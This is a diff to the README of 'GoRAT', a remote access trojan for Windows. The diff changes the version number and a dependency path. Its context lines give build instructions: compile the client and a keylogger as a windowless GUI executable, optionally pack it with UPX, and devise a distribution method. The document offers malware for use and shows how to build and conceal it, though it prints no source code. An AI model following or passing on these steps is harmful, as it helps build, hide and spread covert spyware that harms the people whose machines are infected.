@@ -1,4 +1,4 @@
-## GoRAT 1.2.1
+## GoRAT 1.2.2
 ![alt text](prew.jpg)
 
 Hi, this is RAT for the Windows operating system version 7, 8 and 10. 
@@ -16,7 +16,7 @@ you can also change the PORT in client.go and server.go to the same one.
 
    go get github.com/TheTitanrain/w32
    
-   go get https://github.com/ProtonMail/go-autostart
+   go get github.com/ProtonMail/go-autostart
 
  5. On the Windows operating system, you need to compile the client.go and kelogger.go file with the command: go build -ldflags -H=windowsgui .
  6. If you wish, you can compress the finished exe file with the upx packer and come up with a distribution method, but you yourself will decide.
